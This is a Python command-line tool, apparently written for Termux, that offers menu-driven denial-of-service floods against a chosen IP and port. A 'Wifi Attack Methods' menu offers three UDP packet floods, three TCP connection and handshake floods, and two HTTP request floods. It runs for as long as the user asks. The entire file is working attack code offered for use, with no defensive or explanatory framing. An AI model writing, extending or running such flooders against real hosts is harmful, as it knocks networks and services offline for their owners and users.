#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import time
import errno
import os
import requests
from colorama import init, Fore

os.system("termux-setup-storage")
os.system("clear")

init(autoreset=True)

ASCII_ART = """"""

def udp_spam(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    payload = os.urandom(packet_size)
    print(Fore.CYAN + f"[🚀] UDP Spam on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(payload, (ip, port))
            packet_count += 1
    except socket.error as e:
        print(Fore.RED + f"[❌] Socket error: {e}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_handshake(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00]) + os.urandom(packet_size - 2)
    print(Fore.CYAN + f"[🚀] UDP Handshake Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(handshake, (ip, port))
            packet_count += 1
    except socket.error as e:
        print(Fore.RED + f"[❌] Socket error: {e}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} packets.")

def udp_query(ip, port, duration, packet_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    packet_count = 0
    query = bytes([0xFE, 0x01]) + os.urandom(packet_size - 2)
    print(Fore.CYAN + f"[🚀] UDP Query Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock.sendto(query, (ip, port))
            packet_count += 1
    except socket.error as e:
        print(Fore.RED + f"[❌] Socket error: {e}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    finally:
        sock.close()
        print(Fore.GREEN + f"[✅] Done! Sent {packet_count} query packets.")

def tcp_connect(ip, port, duration, packet_size):
    end_time = time.time() + duration
    connection_count = 0
    print(Fore.CYAN + f"[🚀] TCP Connect Flood on {ip}:{port} | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                connection_count += 1
            except socket.error:
                pass
            finally:
                sock.close()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[❌] Unexpected error: {e}")
    print(Fore.GREEN + f"[✅] Done! Made {connection_count} connections.")

def tcp_join(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    handshake = bytes([0x00, 0x00, 0xFF, 0xFF]) + os.urandom(packet_size - 4)
    print(Fore.CYAN + f"[🚀] TCP Join Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                sock.send(handshake)
                packet_count += 1
            except socket.error:
                pass
            finally:
                sock.close()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[❌] Unexpected error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} join packets.")

def tcp_login(ip, port, duration, packet_size):
    end_time = time.time() + duration
    packet_count = 0
    login = bytes([0x02, 0x00, 0x07]) + b"BotUser" + os.urandom(packet_size - 12)
    print(Fore.CYAN + f"[🚀] TCP Login Flood on {ip}:{port} | {packet_size} bytes | {duration}s...")
    try:
        while time.time() < end_time:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                sock.connect((ip, port))
                sock.send(login)
                packet_count += 1
            except socket.error:
                pass
            finally:
                sock.close()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    except Exception as e:
        print(Fore.RED + f"[❌] Unexpected error: {e}")
    print(Fore.GREEN + f"[✅] Done! Sent {packet_count} login attempts.")

def http_status_flood(ip, port, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:{port}/status"
    print(Fore.CYAN + f"[🚀] HTTP Status Flood on {url} | {duration}s...")
    session = requests.Session()
    try:
        while time.time() < end_time:
            session.get(url, timeout=1)
            request_count += 1
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[❌] HTTP error: {e}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    finally:
        session.close()
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} status requests.")

def http_query_flood(ip, port, duration):
    end_time = time.time() + duration
    request_count = 0
    url = f"http://{ip}:{port}/query"
    print(Fore.CYAN + f"[🚀] HTTP Query Flood on {url} | {duration}s...")
    session = requests.Session()
    try:
        while time.time() < end_time:
            session.get(url, timeout=1)
            request_count += 1
    except requests.exceptions.RequestException as e:
        print(Fore.RED + f"[❌] HTTP error: {e}")
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
    finally:
        session.close()
    print(Fore.GREEN + f"[✅] Done! Sent {request_count} query requests.")

def validate_input(prompt, min_val, max_val, input_type=int, default=None):
    while True:
        try:
            value = input(Fore.LIGHTBLUE_EX + prompt)
            if value == "" and default is not None:
                return default
            value = input_type(value)
            if min_val <= value <= max_val:
                return value
            print(Fore.RED + f"[❌] Must be between {min_val} and {max_val}!")
        except ValueError:
            print(Fore.RED + "[❌] Invalid input! Numbers only.")

def validate_ip(prompt):
    import ipaddress
    while True:
        ip_str = input(Fore.LIGHTBLUE_EX + prompt).strip()
        if not ip_str:
            print(Fore.RED + "[❌] IP cannot be empty!")
            continue
        try:
            ipaddress.ip_address(ip_str)
            return ip_str
        except ValueError:
            print(Fore.RED + "[❌] Invalid IP address format!")

def main():
    print(Fore.YELLOW + ASCII_ART)
    print(Fore.LIGHTBLUE_EX + "   🔹 Wifi Attack Methods 🔹   ")
    print("  [1]. UDP Attack")
    print("  [2]. TCP Attack")
    print("  [3]. HTTP Attack")
    attack_type = input(Fore.LIGHTBLUE_EX + "Select attack type (1-3): ").strip()

    ip = validate_ip("IP Gateway Wifi: ")
    port = validate_input("Enter port (default 80): ", 1, 65535, default=80)
    duration = validate_input("Enter duration (seconds): ", 1, 1e9, float)

    if attack_type == "1":
        print(Fore.LIGHTBLUE_EX + " \n🔹 UDP Methods 🔹 ")
        print("  [1]. UDP Spam")
        print("  [2]. UDP Handshake")  
        print("  [3]. UDP Query")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-3): ").strip()
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": udp_spam,
            "2": udp_handshake,
            "3": udp_query
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid UDP method!")

    elif attack_type == "2":
        print(Fore.LIGHTBLUE_EX + " \n🔹 TCP Methods 🔹 ")
        print("  [1]. TCP Connect")
        print("  [2]. TCP Join")
        print("  [3]. TCP Login")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-3): ").strip()
        packet_size = validate_input("Enter packet size (1-65500): ", 1, 65500)

        methods = {
            "1": tcp_connect,
            "2": tcp_join,
            "3": tcp_login
        }
        if method in methods:
            methods[method](ip, port, duration, packet_size)
        else:
            print(Fore.RED + "[❌] Invalid TCP method!")

    elif attack_type == "3":
        print(Fore.LIGHTBLUE_EX + " \n🔹 HTTP Methods 🔹 ")
        print("  1. HTTP Status Flood")
        print("  2. HTTP Query Flood")
        method = input(Fore.LIGHTBLUE_EX + "Select method (1-2): ").strip()

        methods = {
            "1": http_status_flood,
            "2": http_query_flood
        }
        if method in methods:
            methods[method](ip, port, duration)
        else:
            print(Fore.RED + "[❌] Invalid HTTP method!")

    else:
        print(Fore.RED + "[❌] Invalid attack type!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Program terminated by user.")